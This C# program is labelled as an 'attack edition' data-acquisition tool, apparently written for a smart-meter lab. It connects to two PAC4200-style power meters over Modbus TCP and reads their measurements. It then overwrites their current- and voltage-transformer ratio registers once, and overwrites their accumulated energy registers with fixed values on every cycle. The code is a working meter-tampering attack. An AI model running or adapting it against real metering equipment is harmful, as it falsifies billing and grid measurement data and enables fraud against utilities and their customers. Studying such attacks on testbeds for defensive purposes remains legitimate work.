using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using MeterInterface;
using System.Threading;
using System.Data;
using System.Data.SqlClient;
using System.Timers;
using log4net;
using log4net.Config;
using System.IO;


namespace ConsoleApplicationDataAcquire
{
    class Program
    {
        static string version="0.1.7.SH_Attack_edition_PAC4200_changeCT";
        static bool RunFlag = true;
        static int SampleCount=0;
        const int SampleTime=5;
        public TCPSGInterface TcpMeter1, TcpMeter2;
        double Energy1, Energy2;
        Single U1, U2, I1, I2, P1, P2;
        UInt32 CT1, CT2, PT1, PT2;
        UInt32 CT1new = 25;
        UInt32 CT2new = 25;
        UInt32 PT1new = 400;
        UInt32 PT2new = 400;
        double E11new = 1000000;
        double E12new = 2500000;
        double E21new = 2500000;
        double E22new = 10000000;
        byte[] bholdregs1 = new byte[8];
        byte[] bholdregs2 = new byte[8];
        byte[] bholdregs3 = new byte[4];
        byte[] bholdregs4 = new byte[4];
        byte[] bholdregs5 = new byte[4];
        byte[] bholdregs6 = new byte[4];
        byte[] bholdregs7 = new byte[4];
        byte[] bholdregs8 = new byte[4];
        byte[] bholdregs9 = new byte[4];
        byte[] bholdregs10 = new byte[4];
        byte[] bholdregs11 = new byte[4];
        byte[] bholdregs12 = new byte[4];
        byte[] bholdregs13 = new byte[4];
        byte[] bholdregs14 = new byte[4];
        byte[] bholdregs15 = new byte[4];
        byte[] bholdregs16 = new byte[4];
        byte[] bholdregs17 = new byte[8];
        byte[] bholdregs18 = new byte[8];
        byte[] bholdregs19 = new byte[8];
        byte[] bholdregs20 = new byte[8];
        //时间，用于记录读取数据的时间
        DateTime dataTime;
        bool error=false;
        System.Timers.Timer aTimer;
        //log configuration in app.config 日志组件
        log4net.ILog datalog = log4net.LogManager.GetLogger("DataLogger");
        log4net.ILog errorlog = log4net.LogManager.GetLogger("ErrorLogger");

        //检测程序是否停止
        public void DetectStopFunc()
        {
            Console.ReadKey(true);
            RunFlag = !RunFlag;
            //aTimer.Enabled = RunFlag;
            if(!RunFlag)
                Console.WriteLine("Process stopped.Press any key to continue");
            else
                Console.WriteLine("Process started.Press any key to stop");
        }

        Program()
        {
            try
            {
                //电表连接
                TcpMeter1 = new TCPSGInterface("192.168.1.106"); 
                TcpMeter2 = new TCPSGInterface("192.168.1.107");
            }
            catch (Exception e)
            {
                error = true;
                Console.WriteLine("{0}", e.ToString());
                errorlog.Error(e);
            }

        }
        void Data2mssql()
        {
            if (error)
            {
                Console.WriteLine("Something error happened");
                return;
            }
            dataTime = System.DateTime.Now;
            try
            {
                //read meter data
                //meter1
                TcpMeter1.ReadHoldingRegisters(801, 4, bholdregs1);
                TcpMeter1.ReadHoldingRegisters(1, 2, bholdregs3);
                TcpMeter1.ReadHoldingRegisters(13, 2, bholdregs5);
                TcpMeter1.ReadHoldingRegisters(65, 2, bholdregs7);
                TcpMeter1.ReadHoldingRegisters(50011, 2, bholdregs9);
                TcpMeter1.ReadHoldingRegisters(50005, 2, bholdregs13);
                //meter2
                TcpMeter2.ReadHoldingRegisters(801, 4, bholdregs2);
                TcpMeter2.ReadHoldingRegisters(1, 2, bholdregs4);
                TcpMeter2.ReadHoldingRegisters(13, 2, bholdregs6);
                TcpMeter2.ReadHoldingRegisters(65, 2, bholdregs8);
                TcpMeter2.ReadHoldingRegisters(50011, 2, bholdregs10);
                TcpMeter2.ReadHoldingRegisters(50005, 2, bholdregs14);
            }
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.ToString());
                errorlog.Error(e);
            }
           
            if (System.DateTime.Now.Subtract(dataTime).Seconds > 1)
            {
                Console.WriteLine("too long time between meter reading,drop this data");
                return;
            }
            //协议数据流转换为实际物理数据
            //Energy1对应电表1的费率1寄存器中的电能
            Array.Reverse(bholdregs1, 0, 8);
            Energy1 = BitConverter.ToDouble(bholdregs1, 0);
            Array.Reverse(bholdregs2, 0, 8);
            Energy2 = BitConverter.ToDouble(bholdregs2, 0);
            Array.Reverse(bholdregs3, 0, 4);
            U1 = BitConverter.ToSingle(bholdregs3, 0);
            Array.Reverse(bholdregs4, 0, 4);
            U2 = BitConverter.ToSingle(bholdregs4, 0);
            Array.Reverse(bholdregs5, 0, 4);
            I1 = BitConverter.ToSingle(bholdregs5, 0);
            Array.Reverse(bholdregs6, 0, 4);
            I2 = BitConverter.ToSingle(bholdregs6, 0);
            Array.Reverse(bholdregs7, 0, 4);
            P1 = BitConverter.ToSingle(bholdregs7, 0);
            Array.Reverse(bholdregs8, 0, 4);
            P2 = BitConverter.ToSingle(bholdregs8, 0);
            Array.Reverse(bholdregs9, 0, 4);
            CT1 = BitConverter.ToUInt32(bholdregs9, 0);
            Array.Reverse(bholdregs10, 0, 4);
            CT2 = BitConverter.ToUInt32(bholdregs10, 0);
            Array.Reverse(bholdregs13, 0, 4);
            PT1 = BitConverter.ToUInt32(bholdregs13, 0);
            Array.Reverse(bholdregs14, 0, 4);
            PT2 = BitConverter.ToUInt32(bholdregs14, 0);

            switch (SampleCount)
            {
                case 0://第一次采样，更改采样的电流互感比值
                    SampleCount++;
                    bholdregs11 = BitConverter.GetBytes(CT1new);
                    Array.Reverse(bholdregs11,0,4);
                    bholdregs12 = BitConverter.GetBytes(CT2new);
                    Array.Reverse(bholdregs12,0,4);
                    bholdregs15 = BitConverter.GetBytes(PT1new);
                    Array.Reverse(bholdregs15,0,4);
                    bholdregs16 = BitConverter.GetBytes(PT2new);
                    Array.Reverse(bholdregs16,0,4);
                    bholdregs17 = BitConverter.GetBytes(E11new);
                    Array.Reverse(bholdregs17, 0, 8);
                    bholdregs18 = BitConverter.GetBytes(E12new);
                    Array.Reverse(bholdregs18, 0, 8);
                    bholdregs19 = BitConverter.GetBytes(E21new);
                    Array.Reverse(bholdregs19, 0, 8);
                    bholdregs20 = BitConverter.GetBytes(E22new);
                    Array.Reverse(bholdregs20, 0, 8);
                    try
                    {
                        //对电表的相应的寄存器进行写操作
                        TcpMeter1.WriteMultipleRegistersNew(50011, bholdregs11);
                        TcpMeter2.WriteMultipleRegistersNew(50011, bholdregs12);
                        TcpMeter1.WriteMultipleRegistersNew(50005, bholdregs15);
                        TcpMeter2.WriteMultipleRegistersNew(50005, bholdregs16);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("{0}", e.ToString());
                        errorlog.Error(e);
                    }
                    break;
                default://第二次及以后采样，不更改CT值
                    SampleCount++;
                    break;
                

            }
            LogInfo();
            DebugInfo();
            if (SampleCount >= 0)
            {
                Console.WriteLine("write to METER REGISTER");
                try
                {
                    //Console.WriteLine("write to METER REGISTER");
                    //对电表的相应的寄存器进行写操作
                    TcpMeter1.WriteMultipleRegisters(801, bholdregs17);
                    TcpMeter1.WriteMultipleRegisters(805, bholdregs18);
                    TcpMeter2.WriteMultipleRegisters(801, bholdregs19);
                    TcpMeter2.WriteMultipleRegisters(805, bholdregs20);
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0}", e.ToString());
                    errorlog.Error(e);
                }
            }

        }



        /// <summary>
        /// 调试用
        /// </summary>
        void DebugInfo()
        {
            Console.WriteLine("**************************************");
            Console.WriteLine("{0}", dataTime);
            Console.WriteLine("meter_106 data:");
            Console.WriteLine("Energy_106:{0} Wh", Energy1);
            Console.WriteLine("U_106:{0} V", U1);
            Console.WriteLine("I_106:{0} A", I1);
            Console.WriteLine("P_106:{0} W", P1);
            Console.WriteLine("CT_106:{0} ", CT1);
            Console.WriteLine("PT_106:{0} ", PT1);
            Console.WriteLine("meter_107 data:");
            Console.WriteLine("Energy_107:{0} Wh", Energy2);
            Console.WriteLine("U_107:{0} V", U2);
            Console.WriteLine("I_107:{0} A", I2);
            Console.WriteLine("P_107:{0} W", P2);
            Console.WriteLine("CT_107:{0} ", CT2);
            Console.WriteLine("PT_107:{0} ", PT2);
            //Console.WriteLine("{0}", BitConverter.ToString(bholdregs9));
            //Console.WriteLine("{0}", BitConverter.ToString(bholdregs10));
            //Console.WriteLine("{0}", BitConverter.ToString(bholdregs11));
            //Console.WriteLine("{0}", BitConverter.ToString(bholdregs12));
            //2015.12.26 by sunhong
            Console.WriteLine("**************************************");
        }

        /// <summary>
        /// using log4net, write log to [logfile]
        /// configuration in:AssemblyInfo.cs &amp; app.config
        /// </summary>
        void LogInfo()
        {
            string LogStr;
            LogStr =
                "Date:"+dataTime.ToString()+" "+
                "Energy1:" + Energy1.ToString() + "Wh "+
                "Energy2:" + Energy2.ToString() + "Wh ";
            datalog.Info(LogStr);
        }

        /// <summary>
        /// 程序入口
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            Console.WriteLine("SmartMemte DataAttack Program");
            Console.WriteLine("Version:{0}",version);
            Console.WriteLine("SampleTime: {0} seconds",SampleTime);
            Console.WriteLine("waiting......");
            Program a = new Program();
            Thread aThread = new Thread(new ThreadStart(a.DetectStopFunc));
            aThread.Start();
            Console.WriteLine("<Start>");
            while (RunFlag)
            {
                a.Data2mssql();
                System.Threading.Thread.Sleep(SampleTime*1000);
                //a.DetectStopFunc();
            }

            Console.ReadKey(true);
        }


    }
}
